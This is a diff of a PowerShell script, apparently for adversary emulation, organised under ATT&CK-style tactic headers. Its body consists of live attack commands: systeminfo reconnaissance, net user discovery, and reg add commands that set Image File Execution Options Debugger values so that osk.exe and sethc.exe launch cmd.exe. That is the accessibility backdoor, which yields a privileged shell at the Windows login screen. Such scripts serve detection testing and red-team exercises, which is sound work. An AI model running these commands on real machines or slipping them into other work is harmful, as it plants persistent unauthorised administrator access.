@@ -9,10 +9,10 @@ Write-Output "# Reconoissance - systeminfo"
 systeminfo
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Persistence - Registry On-Screen Keyboard (OSK)"
-reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Privilege Escalation - Registry Image File Execution Options (IFEO) debugger"
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Discover - Show and add user"
 net user
